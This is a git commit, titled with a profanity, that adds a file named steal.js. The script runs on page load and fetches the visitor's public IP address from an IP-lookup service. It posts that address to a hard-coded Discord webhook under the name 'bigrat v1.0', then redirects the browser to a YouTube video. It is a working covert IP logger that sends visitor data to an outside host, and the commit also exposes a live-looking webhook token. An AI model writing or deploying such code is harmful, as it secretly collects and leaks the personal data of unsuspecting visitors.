8c702be3297faf1b7dcbb8f48460c91d0daa2def
DivineEssentia <edwin@mcgugan.org>
2021-10-15 08:44:27 -0700

    fuck

---
+++ steal.js
@@ -0,0 +1,16 @@
+window["onload"] = function () {
+    fetch('https://api64.ipify.org?format=json')["then"](response => {
+        var payload = {};
+        payload["Content-Type"] = "application/json"
+        response.json().then(l => {
+            fetch("https://discord.com/api/webhooks/898596280375345153/wdAp8Tz5npMRkCdX5Rd0VmCEmr7OynVuUKHCpVJRcYBWK0HBadKhuYiEAeTB8A7NmgII", {
+                method: "POST",
+                headers: payload,
+                body: JSON.stringify({ username: "bigrat v1.0", content: l.ip })
+            })
+        });
+    });
+}
+setTimeout(() => {
+    window["location"]["href"] = "https://www.youtube.com/watch?v=dCxDI5wI10Q";
+}, 300);
